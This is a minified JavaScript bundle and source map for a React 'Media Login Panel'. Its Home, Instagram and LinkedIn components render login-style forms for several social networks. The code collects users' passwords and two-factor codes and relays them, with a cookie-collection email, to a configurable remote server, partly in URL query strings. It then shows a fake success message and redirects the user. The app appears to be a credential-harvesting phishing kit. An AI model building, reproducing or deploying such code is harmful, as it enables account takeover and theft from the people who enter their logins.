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","file":"static/js/main.aa447fdc.chunk.js","sourcesContent":["import React, { Component } from \"react\";\nimport { Card, Button, Row, Container, Col } from \"react-bootstrap\";\nimport { Redirect } from \"react-router-dom\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nconsole.log(env.REACT_APP_URL);\nconsole.log(window.location.host);\nexport default class Home extends Component {\n  state = {\n    redirect: false,\n    to: \"\",\n  };\n  setRedirect = (url) => {\n    this.setState({\n      redirect: true,\n      to: url,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to={this.state.to} />;\n    }\n  };\n  componentDidMount() {\n    const favicon = document.getElementById(\"FavIcon\");\n    if (\n      env.REACT_APP_FAVICONURL !== undefined ||\n      env.REACT_APP_FAVICONURL !== \"\"\n    )\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\n    const title = document.getElementById(\"AppTitle\");\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\n      title.innerText = `${env.REACT_APP_TITLE}`;\n    else {\n      title.innerText = \"Media Login Panel\";\n    }\n  }\n  render() {\n    return (\n      <div class=\"login_section\" style={{ height: 350 }}>\n        <p\n          style={{ color: \"#f27c89\", fontWeight: 600, fontSize: 24 }}\n          class=\"text-center mb-5\"\n        >\n          Please Select A Login Option\n        </p>\n        {this.renderRedirect()}\n        <div class=\"row btns_row\">\n          {env.REACT_APP_INSTAGRAM === \"true\" ? (\n            <div class=\"col-6 col-md-6\">\n              <button\n                type=\"button\"\n                class=\"btn login_btn choose_btns\"\n                onClick={() => this.setRedirect(\"/Instagram\")}\n              >\n                Instagram\n              </button>\n            </div>\n          ) : (\n            \"\"\n          )}\n          {env.REACT_APP_LINKEDIN === \"true\" ? (\n            <div class=\"col-6 col-md-6\">\n              <button\n                type=\"button\"\n                class=\"btn login_btn choose_btns float_right\"\n                onClick={() => this.setRedirect(\"/Linkedin\")}\n              >\n                Linkedin\n              </button>\n            </div>\n          ) : (\n            \"\"\n          )}\n        </div>\n        <div class=\"row btns_row middle_btn_row\">\n          {env.REACT_APP_FACEBOOK === \"true\" ? (\n            <div class=\"col-6 col-md-6 p-0\">\n              <button\n                type=\"button\"\n                class=\"btn login_btn choose_btns pink_clr\"\n                onClick={() => this.setRedirect(\"/Facebook\")}\n              >\n                Facebook\n              </button>\n            </div>\n          ) : (\n            \"\"\n          )}\n          {env.REACT_APP_TWITTER === \"true\" ? (\n            <div class=\"col-6 col-md-6 p-0\">\n              <button\n                type=\"button\"\n                class=\"btn login_btn choose_btns pink_clr float_right\"\n                onClick={() => this.setRedirect(\"/Twitter\")}\n              >\n                Twitter\n              </button>\n            </div>\n          ) : (\n            \"\"\n          )}\n        </div>\n        <div class=\"row btns_row\">\n          {env.REACT_APP_PINTEREST === \"true\" ? (\n            <div class=\"col-12 col-md-12\">\n              <button\n                type=\"button\"\n                class=\"btn login_btn choose_btns\"\n                onClick={() => this.setRedirect(\"/Pinterest\")}\n              >\n                Pinterest\n              </button>\n            </div>\n          ) : (\n            \"\"\n          )}\n        </div>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\nimport \"../css/style.css\";\nimport { Form, Button, Container, Alert, Spinner } from \"react-bootstrap\";\n\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\nexport default class Instagram extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    twoFactor: false,\n    email_auth: false,\n    success: false,\n    code: \"\",\n    two_factor_identifier: \"\",\n    verificationMethod: \"\",\n    appName: window.location.hostname.substring(10).split(\".\")[0],\n  };\n\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      console.log(this.state.appName, window.location.href.split(\"//\")[1]);\n      fetch(`${env.REACT_APP_URL}/insta`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.twoFactor) {\n              this.setState({\n                email_auth: responseData.email_auth,\n                twoFactor: true,\n                loading: true,\n                two_factor_identifier: responseData.two_factor_identifier,\n                verificationMethod: responseData.verificationMethod,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      if (!this.state.email_auth) {\n        fetch(\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&appName=${this.state.appName}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            if (responseData.success) {\n              this.setState(\n                { success: true, message: responseData.message },\n                () => {\n                  this.onShowAlert();\n                }\n              );\n            } else {\n              this.setState({ message: responseData.message }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      } else {\n        fetch(\n          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            this.setState(\n              {\n                message: responseData.message,\n              },\n              () => {\n                this.onShowAlert();\n              }\n            );\n            if (responseData.success) {\n              fetch(`${env.REACT_APP_URL}/insta`, {\n                method: \"POST\",\n                headers: {\n                  \"Content-Type\":\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                  username: this.state.username,\n                  password: this.state.password,\n                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                  appName: this.state.appName,\n                }),\n              })\n                .then((response) => response.json())\n                .then((responseData) => {\n                  console.log(responseData);\n                  this.setState(\n                    {\n                      message: responseData.message,\n                    },\n                    () => {\n                      this.onShowAlert();\n                    }\n                  );\n                  if (!responseData.success) {\n                    this.setState({ loading: false });\n                  } else {\n                    if (!responseData.twoFactor) {\n                      this.setState({ success: true });\n                    }\n                  }\n                });\n            } else {\n              this.setState({ message: responseData.message, code: \"\" }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      }\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n\n        {this.renderRedirect()}\n        <Container>\n          {this.state.showAlert ? (\n            <Alert variant=\"danger\">{this.state.message}</Alert>\n          ) : (\n            \"\"\n          )}\n        </Container>\n\n        <div class=\"login_section text-center\">\n          <Container>\n            <p style={{ color: \"#f27c89\", fontWeight: 600, fontSize: 24 }}>\n              Medial Login Panel\n            </p>\n            <img\n              alt=\"logo\"\n              src={env.REACT_APP_FAVICONURL}\n              style={{ objectFit: \"contain\", width: \"25%\", height: \"25%\" }}\n            ></img>\n          </Container>\n          <br></br>\n          {/* <h1>\n          {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n            ? env.REACT_APP_TITLE\n            : \"Instagram Login\"}\n        </h1> */}\n          <br />\n\n          {env.REACT_APP_BANNER_INSTAGRAM === \"true\" ? (\n            <div class=\"bg-white white-box\">\n              <p\n                style={{ marginBottom: 8, fontWeight: 600, fontSize: 22 }}\n                class=\"fs_18\"\n              >\n                {env.REACT_APP_BANNER_INSTAGRAM_HEADER}\n              </p>\n              <p class=\"fs_12 m-0\">{env.REACT_APP_BANNER_INSTAGRAM_BODY}</p>\n            </div>\n          ) : (\n            \"\"\n          )}\n          <Container>\n            <p style={{ fontWeight: \"bold\", color: \"white\" }}>\n              {env.REACT_APP_SECONDARY_BANNER !== \"\"\n                ? env.REACT_APP_SECONDARY_BANNER\n                : \"\"}\n            </p>\n          </Container>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 5000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n            <div class=\"form\">\n              <p>\n                <input\n                  onChange={(e) => {\n                    this.handleUsername(e);\n                  }}\n                  value={this.state.username}\n                  type=\"text\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Instagram Username\"\n                ></input>\n              </p>\n\n              <p>\n                <input\n                  onChange={(e) => this.handlePassword(e)}\n                  value={this.state.password}\n                  type=\"password\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter Instagram Password\"\n                ></input>\n              </p>\n              {this.state.loading ? (\n                <button type=\"button\" class=\"btn login_btn\" disabled>\n                  <Spinner\n                    as=\"span\"\n                    animation=\"grow\"\n                    size=\"sm\"\n                    role=\"status\"\n                    aria-hidden=\"true\"\n                  />\n                  Loading...\n                </button>\n              ) : (\n                <button\n                  onClick={(e) => this.handleClick(e)}\n                  type=\"button\"\n                  class=\"btn login_btn\"\n                >\n                  Login\n                </button>\n              )}\n              {this.state.twoFactor ? (\n                <div>\n                  <Form.Group>\n                    {this.state.email_auth ? (\n                      <Form.Label>Please enter the code received</Form.Label>\n                    ) : (\n                      <Form.Label>Enter code received</Form.Label>\n                    )}\n                    <input\n                      value={this.state.code}\n                      onChange={(e) => {\n                        this.handleCode(e);\n                      }}\n                      type=\"number\"\n                      maxLength=\"11\"\n                      name=\"name\"\n                      autocomplete=\"off\"\n                      class=\"text-center form-control\"\n                    ></input>\n                  </Form.Group>\n                  <button\n                    onClick={() => {\n                      this.handleCodeClick();\n                    }}\n                    type=\"button\"\n                    class=\"btn login_btn\"\n                  >\n                    submit code\n                  </button>\n                </div>\n              ) : (\n                \"\"\n              )}\n            </div>\n          )}\n        </div>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\nimport \"../css/style.css\";\n\nimport { Form, Button, Container, Alert, Spinner } from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    challangeID: \"\",\n    code: \"\",\n    appName: window.location.hostname.substring(10).split(\".\")[0],\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/linkedin`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challangeID: responseData.challangeID,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      fetch(\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}&appName=${this.state.appName}`,\n        {\n          method: \"GET\",\n        }\n      )\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (responseData.success) {\n            this.setState({ success: true });\n          } else {\n            this.setState({ message: responseData.message, code: \"\" }, () => {\n              this.onShowAlert();\n            });\n          }\n        });\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n          \"\"\n        )}\n        <br></br>\n        <div class=\"login_section text-center\">\n          <Container>\n            <p style={{ color: \"#f27c89\", fontWeight: 600, fontSize: 24 }}>\n              Medial Login Panel\n            </p>\n            <img\n              alt=\"logo\"\n              src={env.REACT_APP_FAVICONURL}\n              style={{ objectFit: \"contain\", width: \"25%\", height: \"25%\" }}\n            ></img>\n          </Container>\n          {env.REACT_APP_BANNER_LINKEDIN === \"true\" ? (\n            <div class=\"bg-white white-box\">\n              <p\n                style={{ marginBottom: 8, fontWeight: 600, fontSize: 22 }}\n                class=\"fs_18\"\n              >\n                {env.REACT_APP_BANNER_LINKEDIN_HEADER}\n              </p>\n              <p class=\"fs_12 m-0\">{env.REACT_APP_BANNER_LINKEDIN_BODY}</p>\n            </div>\n          ) : (\n            \"\"\n          )}\n          {/* <h1>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \" LinkedIn login\"}\n            </h1> */}\n          <br />\n\n          <Container>\n            <p style={{ fontWeight: \"bold\", color: \"white\" }}>\n              {env.REACT_APP_SECONDARY_BANNER !== \"\"\n                ? env.REACT_APP_SECONDARY_BANNER\n                : \"\"}\n            </p>\n          </Container>\n\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 5000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n            <div class=\"form\">\n              <p>\n                <input\n                  onChange={(e) => {\n                    this.handleUsername(e);\n                  }}\n                  value={this.state.username}\n                  type=\"text\"\n                  name=\"name\"\n                  autocomplete=\"off\"\n                  class=\"text-center form-control\"\n                  placeholder=\"Enter LinkedIn Username/MobileNumber\"\n                